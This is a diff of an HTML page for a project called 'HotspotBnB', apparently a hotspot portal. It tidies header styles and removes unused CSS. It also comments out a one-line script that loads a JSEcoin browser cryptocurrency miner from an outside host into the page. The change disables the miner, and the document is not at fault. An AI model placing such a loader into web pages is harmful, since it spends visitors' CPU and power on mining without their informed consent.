@@ -89,23 +89,6 @@ body {
 min-height:100vh;
 }
 
-.fullscreen {
-float: right; 
-display:block; 
-opacity: 1; 
-color:white; 
-top:0px; 
-height:0px;
-margin-top:10px;
-padding:0; 
-max-width: 3px;
-width:3px;
-background: -webkit-gradient(radial, 50% 50%, 0, 20% 20%, 150, from(#fff), to(rgba(0,10,0,100)));
-border:none;
-margin-right:calc(45vw);
-margin-left: calc(90vw); 
-text-align:center;
-}
 </style>
 
 <script>
@@ -182,12 +165,10 @@ html {
  <body id="body"  scrolling="auto"  onload="resizebody(this);" >
 	<header class="cd-header">
 
-		<span class="glyphicon glyphicon-cog" style="margin-top: 2.8rem; max-width: calc(100vw - 80px)!important; width: 18rem!important;margin-right: calc(-25rem + 11rem)!important; float: right!important; color: white; zoom: 1.8; margin-left: calc(50% - 54px);"></span>
-		</a>
 			<!--- <a href="#anchor"  class="logo"> --->
-		<form action="/" method="post" class="squirrel" onkeydown="return event.key != 'Enter';" class="logo" style="background:transparent!important;opacity:1;margin-top: 0.8rem; max-width: calc(100vw - 80px)!important; width: 23rem!important; margin-right: calc(-25rem + 13rem)!important; float: right!important;" alt="Logo">
+		<form action="/" method="post" onkeydown="return event.key != 'Enter';" class="squirrel logo" alt="Logo">
                   <p style="color:white;background:transparent;"><br>
-                   <input border="0" type="text" name="HotspotBnB" placeholder="HotspotBnB v0.0.1-rc.7" id="HotspotBnB" value="HotspotBnB" style="border:1px solid transparent!important; background:transparent; color:white;font-size: 2.5rem;opacity: 0.6;max-width: 210px;text-align: center;">
+                   <input border="0" type="text" name="HotspotBnB" placeholder="HotspotBnB v0.0.1-rc.7" id="HotspotBnB" value="HotspotBnB" class="forminput">
                   </p>
                 </form>
 		
@@ -253,8 +234,8 @@ html {
 <script>
   iFrameResize({ log: true }, '#body')
 </script>
- <script type="text/javascript">
+<!-- <script type="text/javascript">
 !function(){window.JSEDarkMode=1;window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/68296/10.3.141.1/0/0/",s.parentNode.insertBefore(t,s)}();
-</script> 
+</script> --> 
 </body>
 </html>
